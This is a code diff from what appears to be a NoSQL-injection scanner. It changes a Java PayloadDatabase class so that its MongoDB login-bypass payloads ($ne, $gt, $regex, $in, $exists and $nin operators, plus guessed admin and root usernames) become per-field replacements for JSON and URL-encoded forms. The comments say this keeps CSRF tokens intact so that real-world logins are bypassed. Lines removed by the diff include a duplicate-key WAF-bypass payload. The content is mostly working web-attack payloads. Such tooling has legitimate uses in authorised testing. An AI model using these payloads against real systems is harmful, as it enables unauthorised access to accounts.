@@ -268,55 +268,68 @@ public class PayloadDatabase {
     }
 
     // ─────────────────────────────────────────────────────────────
-    // AUTH BYPASS PAYLOADS (full request body replacements)
+    // AUTH BYPASS PAYLOADS (per-field replacement parts)
     // ─────────────────────────────────────────────────────────────
 
     /**
-     * Auth bypass for URL-encoded login forms.
-     * Returns list of full body strings to try.
+     * One auth-bypass attempt as PER-FIELD replacement parts. Rewriting only
+     * the auth fields keeps every other field of the original body (CSRF
+     * tokens, session hints, extra parameters) intact — replacing the whole
+     * body used to silently drop them and break real-world logins.
      */
-    public static List<String> getAuthBypassUrlEncoded(String userField, String passField) {
-        List<String> payloads = new ArrayList<>();
+    public static class AuthBypassPair {
+        public final String userPart;
+        public final String passPart;
+        public final String description;
 
-        payloads.add(userField + "[$ne]=nosqli_xyz&" + passField + "[$ne]=nosqli_xyz");
-        payloads.add(userField + "[$gt]=&" + passField + "[$gt]=");
-        payloads.add(userField + "[$gte]=&" + passField + "[$gte]=");
-        payloads.add(userField + "[$regex]=.*&" + passField + "[$regex]=.*");
-        payloads.add(userField + "[$nin][]=xyz_impossible&" + passField + "[$nin][]=xyz_impossible");
-        payloads.add(userField + "[$gt]=admin&" + userField + "[$lt]=test&" + passField + "[$ne]=nosqli");
-        payloads.add(userField + "[$in][]=admin&" + userField + "[$in][]=user&" + userField + "[$in][]=administrator&" + passField + "[$gt]=");
-        payloads.add(userField + "[$exists]=true&" + passField + "[$exists]=true");
-        payloads.add(userField + "[$regex]=admin.*&" + passField + "[$ne]=");
-        payloads.add(userField + "=admin&" + passField + "[$ne]=nosqli_impossible_xyz");
-        payloads.add(userField + "=administrator&" + passField + "[$ne]=nosqli_impossible_xyz");
-        payloads.add(userField + "=root&" + passField + "[$ne]=nosqli_impossible_xyz");
-
-        return payloads;
+        public AuthBypassPair(String userPart, String passPart, String description) {
+            this.userPart = userPart;
+            this.passPart = passPart;
+            this.description = description;
+        }
     }
 
     /**
-     * Auth bypass for JSON login forms.
+     * JSON auth-bypass parts: raw JSON values inserted for the user/pass
+     * fields — plain strings must come pre-quoted, operators as objects.
      */
-    public static List<String> getAuthBypassJson(String userField, String passField) {
-        List<String> payloads = new ArrayList<>();
-
-        payloads.add("{\"" + userField + "\": {\"$ne\": null}, \"" + passField + "\": {\"$ne\": null}}");
-        payloads.add("{\"" + userField + "\": {\"$ne\": \"nosqli_xyz\"}, \"" + passField + "\": {\"$ne\": \"nosqli_xyz\"}}");
-        payloads.add("{\"" + userField + "\": {\"$gt\": \"\"}, \"" + passField + "\": {\"$gt\": \"\"}}");
-        payloads.add("{\"" + userField + "\": {\"$gte\": \"\"}, \"" + passField + "\": {\"$gte\": \"\"}}");
-        payloads.add("{\"" + userField + "\": {\"$regex\": \".*\"}, \"" + passField + "\": {\"$regex\": \".*\"}}");
-        payloads.add("{\"" + userField + "\": {\"$exists\": true}, \"" + passField + "\": {\"$exists\": true}}");
-        payloads.add("{\"" + userField + "\": {\"$nin\": [\"nosqli_impossible_xyz\"]}, \"" + passField + "\": {\"$nin\": [\"nosqli_impossible_xyz\"]}}");
+    public static List<AuthBypassPair> getAuthBypassJsonParts() {
+        List<AuthBypassPair> pairs = new ArrayList<>();
+        pairs.add(new AuthBypassPair("{\"$ne\": null}", "{\"$ne\": null}", "$ne null on both fields"));
+        pairs.add(new AuthBypassPair("{\"$ne\": \"nosqli_xyz\"}", "{\"$ne\": \"nosqli_xyz\"}", "$ne impossible value on both"));
+        pairs.add(new AuthBypassPair("{\"$gt\": \"\"}", "{\"$gt\": \"\"}", "$gt empty string on both"));
+        pairs.add(new AuthBypassPair("{\"$gte\": \"\"}", "{\"$gte\": \"\"}", "$gte empty string on both"));
+        pairs.add(new AuthBypassPair("{\"$regex\": \".*\"}", "{\"$regex\": \".*\"}", "$regex match all on both"));
         // Single-account regex: apps that error when the query matches more
         // than one record ("unexpected number of records") — this matches only
         // admin-ish accounts, so exactly one record is returned.
-        payloads.add("{\"" + userField + "\": {\"$regex\": \"admin.*\"}, \"" + passField + "\": {\"$ne\": \"\"}}");
-        payloads.add("{\"" + userField + "\": {\"$in\": [\"admin\", \"administrator\", \"root\", \"Admin\"]}, \"" + passField + "\": {\"$gt\": \"\"}}");
-        payloads.add("{\"" + userField + "\": \"admin\", \"" + passField + "\": {\"$ne\": \"nosqli_impossible_xyz\"}}");
-        // Duplicate key WAF bypass (MongoDB uses last key)
-        payloads.add("{\"" + userField + "\": \"legitimate\", \"" + passField + "\": \"legitimate\", \"" + passField + "\": {\"$ne\": null}}");
+        pairs.add(new AuthBypassPair("{\"$regex\": \"admin.*\"}", "{\"$ne\": \"\"}", "$regex admin.* username, $ne password"));
+        pairs.add(new AuthBypassPair("{\"$exists\": true}", "{\"$exists\": true}", "$exists true on both"));
+        pairs.add(new AuthBypassPair("{\"$nin\": [\"nosqli_impossible_xyz\"]}", "{\"$nin\": [\"nosqli_impossible_xyz\"]}", "$nin impossible value on both"));
+        pairs.add(new AuthBypassPair("{\"$in\": [\"admin\", \"administrator\", \"root\", \"Admin\"]}", "{\"$gt\": \"\"}", "$in common admin names + $gt password"));
+        pairs.add(new AuthBypassPair("\"admin\"", "{\"$ne\": \"nosqli_impossible_xyz\"}", "known user admin + $ne password"));
+        pairs.add(new AuthBypassPair("\"administrator\"", "{\"$ne\": \"nosqli_impossible_xyz\"}", "known user administrator + $ne password"));
+        pairs.add(new AuthBypassPair("\"root\"", "{\"$ne\": \"nosqli_impossible_xyz\"}", "known user root + $ne password"));
+        return pairs;
+    }
 
-        return payloads;
+    /**
+     * URL-encoded auth-bypass parts: pair SUFFIXES appended to the field
+     * name — "[$ne]=x" for operator injection, "=admin" for a plain value.
+     */
+    public static List<AuthBypassPair> getAuthBypassUrlEncodedParts() {
+        List<AuthBypassPair> pairs = new ArrayList<>();
+        pairs.add(new AuthBypassPair("[$ne]=nosqli_xyz", "[$ne]=nosqli_xyz", "$ne impossible value on both"));
+        pairs.add(new AuthBypassPair("[$gt]=", "[$gt]=", "$gt empty string on both"));
+        pairs.add(new AuthBypassPair("[$gte]=", "[$gte]=", "$gte empty string on both"));
+        pairs.add(new AuthBypassPair("[$regex]=.*", "[$regex]=.*", "$regex match all on both"));
+        pairs.add(new AuthBypassPair("[$regex]=admin.*", "[$ne]=", "$regex admin.* username, $ne password"));
+        pairs.add(new AuthBypassPair("[$nin][]=xyz_impossible", "[$nin][]=xyz_impossible", "$nin impossible value on both"));
+        pairs.add(new AuthBypassPair("[$exists]=true", "[$exists]=true", "$exists true on both"));
+        pairs.add(new AuthBypassPair("=admin", "[$ne]=nosqli_impossible_xyz", "known user admin + $ne password"));
+        pairs.add(new AuthBypassPair("=administrator", "[$ne]=nosqli_impossible_xyz", "known user administrator + $ne password"));
+        pairs.add(new AuthBypassPair("=root", "[$ne]=nosqli_impossible_xyz", "known user root + $ne password"));
+        return pairs;
     }
 
     // ─────────────────────────────────────────────────────────────
